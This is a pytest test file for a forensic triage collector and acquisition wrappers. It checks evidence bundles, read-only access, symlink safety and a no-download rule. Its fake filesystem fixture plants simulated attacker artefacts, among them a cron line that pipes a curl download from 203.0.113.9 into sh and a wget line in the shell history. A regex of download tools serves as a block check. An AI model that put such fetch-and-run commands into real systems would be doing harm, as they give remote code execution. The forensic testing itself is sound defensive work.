"""Phase 5: the endpoint collectors and acquisition wrappers (collector/). No network.

The Linux collector runs in-process against a fake root (``--root``: the dead-box mode), so it
works on every OS; the PowerShell tests need Windows PowerShell 5.1 and skip elsewhere.
"""

from __future__ import annotations

import hashlib
import importlib.util
import json
import os
import re
import shutil
import subprocess
import sys
import zipfile
from pathlib import Path
from types import ModuleType

import pytest

from app.collection.bundle import BundleLimits, BundleReader

REPO = Path(__file__).resolve().parents[3]
COLLECTOR = REPO / "collector"
FIXTURES = Path(__file__).resolve().parents[1] / "fixtures"
POWERSHELL = shutil.which("powershell.exe") if sys.platform == "win32" else None
BASH = shutil.which("bash")
POSIX = os.name == "posix"
DOWNLOADERS = re.compile(
    r"Invoke-WebRequest|Invoke-RestMethod|Start-BitsTransfer|DownloadFile|DownloadString|"
    r"Net\.WebClient|\bcurl\b|\bwget\b|urllib|requests\.get|\bbitsadmin\b",
    re.IGNORECASE,
)


def _load_linux_collector() -> ModuleType:
    spec = importlib.util.spec_from_file_location("collect_linux", COLLECTOR / "collect_linux.py")
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def _fake_root(root: Path) -> None:
    files = {
        "etc/hostname": b"web01\n",
        "etc/timezone": b"Europe/Berlin\n",
        "etc/os-release": b'PRETTY_NAME="Test Linux 1.0"\n',
        "etc/passwd": b"root:x:0:0::/root:/bin/sh\nalice:x:1000:1000::/home/alice:/bin/sh\n",
        "etc/shadow": b"root:$6$secret:19000:0:99999:7:::\n",
        "etc/crontab": b"* * * * * root /tmp/.x/payload\n",
        "etc/cron.d/evil": b"*/5 * * * * root curl http://203.0.113.9/x | sh\n",
        "var/log/auth.log": (FIXTURES / "linux" / "auth.log").read_bytes(),
        "var/log/auth.log.1": b"Jan  1 00:00:01 web01 sshd[1]: Accepted password for bob\n",
        "var/log/unrelated.log": b"not collected\n",
        "home/alice/.bash_history": b"wget http://203.0.113.9/x\nchmod +x x\n",
        "home/alice/.ssh/authorized_keys": b"ssh-ed25519 AAAAC3 attacker\n",
        "home/alice/.ssh/id_ed25519": b"-----BEGIN OPENSSH PRIVATE KEY-----\n",
        "tmp/.x/payload": b"\x7fELF",
    }
    for rel, data in files.items():
        path = root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(data)


def _snapshot(root: Path) -> dict[str, tuple[int, int, str]]:
    out = {}
    for path in sorted(root.rglob("*")):
        st = path.lstat()
        digest = hashlib.sha256(path.read_bytes()).hexdigest() if path.is_file() else ""
        out[str(path.relative_to(root))] = (st.st_size, st.st_mtime_ns, digest)
    return out


def _run_linux(tmp_path: Path, *extra: str) -> tuple[Path, dict[str, object], Path]:
    root, out = tmp_path / "root", tmp_path / "out"
    if not root.exists():
        _fake_root(root)
    module = _load_linux_collector()
    rc = module.main(["--root", str(root), "--output", str(out), "--operator", "tester", *extra])
    assert rc == 0
    [bundle] = out.glob("*.zip")
    manifest = json.loads(zipfile.ZipFile(bundle).read("manifest.json"))
    return bundle, manifest, root


def _verify(bundle: Path, tmp_path: Path) -> dict[str, int]:
    with BundleReader(bundle, BundleLimits()) as reader:
        manifest, _ = reader.read_manifest()
        return reader.extract(tmp_path / "verify", manifest).counts()


# ---------------------------------------------------------------------------------- Linux


def test_linux_collector_bundle_verifies_through_ingest(tmp_path: Path) -> None:
    bundle, manifest, _ = _run_linux(tmp_path, "--case-ref", "IR-7")
    assert _verify(bundle, tmp_path) == {"verified": len(manifest["files"])}  # type: ignore[arg-type]
    paths = {f["path"] for f in manifest["files"]}  # type: ignore[attr-defined]
    assert {
        "logs/var/log/auth.log",
        "logs/var/log/auth.log.1",
        "files/etc/passwd",
        "persistence/etc/crontab",
        "persistence/etc/cron.d/evil",
        "files/home/alice/.bash_history",
        "files/home/alice/.ssh/authorized_keys",
        "system/etc/os-release",
        "volatile/tmp_listing.json",
    } <= paths
    # no credential material, nothing outside the target lists
    assert not any("shadow" in p or "id_ed25519" in p or "unrelated" in p for p in paths)
    assert manifest["schema"] == "dfirbench.triage/1"
    assert manifest["mode"] == "offline" and manifest["case_ref"] == "IR-7"
    assert manifest["host"] == {  # type: ignore[comparison-overlap]
        "hostname": "web01",
        "fqdn": None,
        "os": "Test Linux 1.0",
        "timezone": "Europe/Berlin",
        "utc_offset_minutes": None,
        "boot_time": None,
    }
    collector = manifest["collector"]
    assert collector["name"] == "dfirbench-collect-linux"  # type: ignore[index]
    lf = (COLLECTOR / "collect_linux.py").read_bytes()
    assert collector["sha256"] == hashlib.sha256(lf).hexdigest()  # type: ignore[index]
    sidecar = bundle.with_name(bundle.name + ".sha256").read_text().split()
    assert sidecar == [hashlib.sha256(bundle.read_bytes()).hexdigest(), bundle.name]
    for entry in manifest["files"]:  # type: ignore[attr-defined]
        assert re.fullmatch(r"\d{4}-\d\d-\d\dT\d\d:\d\d:\d\dZ", entry["collected_at"])


def test_linux_collector_is_read_only_toward_the_source(tmp_path: Path) -> None:
    root = tmp_path / "root"
    _fake_root(root)
    before = _snapshot(root)
    _, _, _ = _run_linux(tmp_path)
    assert _snapshot(root) == before
    outputs = sorted(p.name for p in (tmp_path / "out").iterdir())
    assert len(outputs) == 2 and outputs[1].endswith(".zip.sha256")


def test_linux_collector_refuses_output_inside_root(tmp_path: Path) -> None:
    root = tmp_path / "root"
    _fake_root(root)
    module = _load_linux_collector()
    assert module.main(["--root", str(root), "--output", str(root / "out")]) == 2
    assert not (root / "out").exists()


@pytest.mark.skipif(not POSIX or os.geteuid() == 0, reason="needs POSIX permissions, not root")
def test_linux_collector_records_unreadable_files_and_skips_links(tmp_path: Path) -> None:
    root = tmp_path / "root"
    _fake_root(root)
    secret = root / "etc" / "sudoers"
    secret.write_bytes(b"root ALL=(ALL) ALL\n")
    secret.chmod(0)
    (root / "var" / "log" / "auth.log.2").symlink_to("/etc/hostname")
    os.mkfifo(root / "var" / "log" / "syslog")  # reading a FIFO would block
    try:
        _, manifest, _ = _run_linux(tmp_path)
    finally:
        secret.chmod(0o600)
    errors = {e["target"]: e["error"] for e in manifest["errors"]}  # type: ignore[attr-defined]
    assert errors["/etc/sudoers"].startswith("PermissionError")
    skipped = {s["target"]: s["reason"] for s in manifest["skipped"]}  # type: ignore[attr-defined]
    assert skipped["/var/log/auth.log.2"] == "symlink"
    assert skipped["/var/log/syslog"] == "not_regular_file"


def test_linux_collector_size_caps(tmp_path: Path) -> None:
    root = tmp_path / "root"
    _fake_root(root)
    (root / "var" / "log" / "syslog").write_bytes(b"x" * (2 * 1024 * 1024))
    _, manifest, _ = _run_linux(tmp_path, "--max-file-mb", "1")
    skipped = {s["target"]: s["reason"] for s in manifest["skipped"]}  # type: ignore[attr-defined]
    assert skipped["/var/log/syslog"] == "larger_than_max_file_mb"


# ---------------------------------------------------------------------------------- PowerShell


def _ps1_files() -> list[Path]:
    return sorted(COLLECTOR.rglob("*.ps1"))


@pytest.mark.parametrize("path", _ps1_files(), ids=lambda p: p.name)
def test_powershell_scripts_are_ascii_and_51_compatible(path: Path) -> None:
    text = path.read_bytes().decode("ascii")  # PS 5.1 reads BOM-less files as ANSI
    code = "\n".join(line.split("#", 1)[0] for line in text.splitlines())
    for token in ("??", "?.", " && ", " || ", "-Parallel", "ForEach-Object -Parallel"):
        assert token not in code, f"PowerShell 7-only syntax {token!r} in {path.name}"
    assert "-LiteralPath" in text


@pytest.mark.skipif(POWERSHELL is None, reason="Windows PowerShell 5.1 not available")
@pytest.mark.parametrize("path", _ps1_files(), ids=lambda p: p.name)
def test_powershell_scripts_parse_with_51(path: Path) -> None:
    script = (
        "$e=$null;$t=$null;"
        f"[void][System.Management.Automation.Language.Parser]::ParseFile('{path}',[ref]$t,[ref]$e);"
        "'{0}|{1}' -f $PSVersionTable.PSVersion.Major, $e.Count"
    )
    out = subprocess.run(
        [str(POWERSHELL), "-NoProfile", "-NonInteractive", "-Command", script],
        capture_output=True,
        text=True,
        timeout=120,
        check=True,
    ).stdout.strip()
    assert out == "5|0", out


@pytest.mark.skipif(POWERSHELL is None, reason="Windows PowerShell 5.1 not available")
def test_windows_collector_quick_run_produces_a_verifiable_bundle(tmp_path: Path) -> None:
    source = tmp_path / "src" / "app.log"
    source.parent.mkdir()
    source.write_bytes(b"2026-01-03 00:00:00 login ok\r\n")
    before = (source.stat().st_mtime_ns, source.read_bytes())
    out = tmp_path / "out"
    proc = subprocess.run(
        [
            str(POWERSHELL),
            "-NoProfile",
            "-NonInteractive",
            "-ExecutionPolicy",
            "Bypass",
            "-File",
            str(COLLECTOR / "collect-windows.ps1"),
            "-OutputDir",
            str(out),
            "-NoVolatile",
            "-NoEventLogs",
            "-NoFiles",
            "-CaseRef",
            "IR-9",
            "-ExtraPaths",
            f"{source}|{tmp_path / 'missing.txt'}",
        ],
        capture_output=True,
        text=True,
        timeout=300,
    )
    assert proc.returncode == 0, proc.stderr
    [bundle] = out.glob("*.zip")
    assert [p.name for p in out.iterdir() if p.is_dir()] == []  # staging removed
    manifest = json.loads(zipfile.ZipFile(bundle).read("manifest.json").decode("utf-8-sig"))
    assert _verify(bundle, tmp_path) == {"verified": len(manifest["files"])}
    paths = {f["path"] for f in manifest["files"]}
    assert {"files/extra/app.log", "system/os_info.json", "system/time_sync.txt"} <= paths
    assert manifest["case_ref"] == "IR-9" and manifest["collector"]["sha256"]
    assert any(e["target"].endswith("missing.txt") for e in manifest["errors"])
    assert (source.stat().st_mtime_ns, source.read_bytes()) == before


@pytest.mark.skipif(POWERSHELL is None, reason="Windows PowerShell 5.1 not available")
def test_windows_memory_wrapper_never_downloads_a_missing_tool(tmp_path: Path) -> None:
    proc = subprocess.run(
        [
            str(POWERSHELL),
            "-NoProfile",
            "-NonInteractive",
            "-ExecutionPolicy",
            "Bypass",
            "-File",
            str(COLLECTOR / "acquire" / "acquire-memory-windows.ps1"),
            "-OutputDir",
            str(tmp_path / "mem"),
            "-WinPmemPath",
            str(tmp_path / "nope" / "winpmem.exe"),
        ],
        capture_output=True,
        text=True,
        timeout=120,
    )
    assert proc.returncode == 2 and "does not download" in proc.stderr
    assert not (tmp_path / "mem").exists()


# ---------------------------------------------------------------------------------- wrappers


def test_no_collector_or_wrapper_downloads_anything() -> None:
    for path in sorted(COLLECTOR.rglob("*")):
        if path.suffix not in (".ps1", ".sh", ".py"):
            continue
        code = "\n".join(
            line
            for line in path.read_text(encoding="utf-8").splitlines()
            if not line.lstrip().startswith("#")
        )
        assert not DOWNLOADERS.search(code), f"download command in {path.name}"


@pytest.mark.skipif(BASH is None, reason="bash not available")
@pytest.mark.parametrize(
    ("script", "args", "code", "message"),
    [
        ("acquire-memory-linux.sh", ["--output", "OUT", "--avml", "/nonexistent/avml"], 2,
         "does not download"),
        ("acquire-disk-linux.sh", ["--source", "/dev/null0", "--output", "OUT",
                                   "--tool", "ewfacquire-missing"], 2, "unsupported --tool"),
        ("acquire-memory-linux.sh", ["--bogus"], 2, "unknown argument"),
        ("acquire-disk-linux.sh", ["--output", "OUT"], 2, "--source and --output are required"),
    ],
)  # fmt: skip
def test_linux_wrappers_fail_cleanly(
    script: str, args: list[str], code: int, message: str, tmp_path: Path
) -> None:
    path = COLLECTOR / "acquire" / script
    syntax = subprocess.run([str(BASH), "-n", str(path)], capture_output=True, timeout=60)
    assert syntax.returncode == 0, syntax.stderr
    argv = [a.replace("OUT", (tmp_path / "out").as_posix()) for a in args]
    proc = subprocess.run([str(BASH), str(path), *argv], capture_output=True, text=True, timeout=60)
    assert proc.returncode == code and message in proc.stderr, proc.stderr
    assert not (tmp_path / "out").exists()


def _link_dir(link: Path, target: Path) -> None:
    """A directory symlink (a junction on Windows, which needs no privilege)."""
    link.parent.mkdir(parents=True, exist_ok=True)
    if sys.platform == "win32":
        import _winapi

        _winapi.CreateJunction(str(target), str(link))
    else:
        link.symlink_to(target, target_is_directory=True)


def test_linux_collector_names_and_ratios_pass_the_server_checks(tmp_path: Path) -> None:
    root = tmp_path / "root"
    _fake_root(root)
    autostart = root / "home/alice/.config/autostart"
    autostart.mkdir(parents=True)
    (autostart / "Straße.desktop").write_bytes(b"[Desktop Entry]\n")
    (autostart / "STRASSE.desktop").write_bytes(b"[Desktop Entry]\n")
    (root / "home/alice/.bash_history").write_bytes(b"ls -la\n" * 300_000)  # 2.1 MB, ~1000:1
    bundle, manifest, _ = _run_linux(tmp_path)
    counts = _verify(bundle, tmp_path)  # BundleRejectedError if the server would refuse it
    assert counts
    names = {f["path"] for f in manifest["files"]}  # type: ignore[index]
    assert sum("autostart" in n for n in names) == 2


def test_linux_collector_does_not_follow_symlinked_directories_to_secrets(tmp_path: Path) -> None:
    root = tmp_path / "root"
    _fake_root(root)
    _link_dir(root / "home/alice/.config/autostart", root / "etc")
    outside = tmp_path / "examiner"
    (outside / "notes").mkdir(parents=True)
    (outside / "notes/x.desktop").write_bytes(b"examiner's own file\n")
    _link_dir(root / "etc/xdg/autostart", outside / "notes")
    _, manifest, _ = _run_linux(tmp_path)
    collected = {f["source"]: f for f in manifest["files"]}  # type: ignore[index]
    skipped = {(s["target"], s["reason"]) for s in manifest["skipped"]}  # type: ignore[index]
    assert "/home/alice/.config/autostart/shadow" not in collected
    assert ("/home/alice/.config/autostart/shadow", "never_collected") in skipped
    assert ("/etc/xdg/autostart/x.desktop", "outside_root") in skipped


def test_linux_collector_text_helpers_handle_undecodable_names() -> None:
    module = _load_linux_collector()
    bad = b"/tmp/\xff".decode("utf-8", "surrogateescape")
    assert module.text(bad) == r"/tmp/\xff"
    assert module.safe_component("\udcff") == "_xff"  # the backslash is an unsafe character
    json.dumps(module.clean_json({"files": [{"source": bad}]}), ensure_ascii=False).encode()
